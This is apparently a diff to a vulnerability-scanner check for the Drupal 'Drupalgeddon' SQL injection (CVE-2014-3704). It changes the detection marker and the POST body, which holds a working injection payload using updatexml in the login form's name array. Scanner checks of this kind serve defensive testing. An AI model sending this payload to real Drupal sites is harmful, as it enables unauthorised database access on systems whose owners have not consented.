@@ -1,8 +1,9 @@
 #request urls = array
 #define payload = /?q=node&destination=node
-#define bug = The website encountered 
+#define bug = fae0b27c451c728867a567e8c1bb4e53
 #define info = 存在Drupal < 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）
-#define post = pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&name[0]=a
+#define post = pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or
+updatexml(0x23,concat(1,md5(666)),1)%23]=bob&name[0]=a
 
 function main(args)
 {
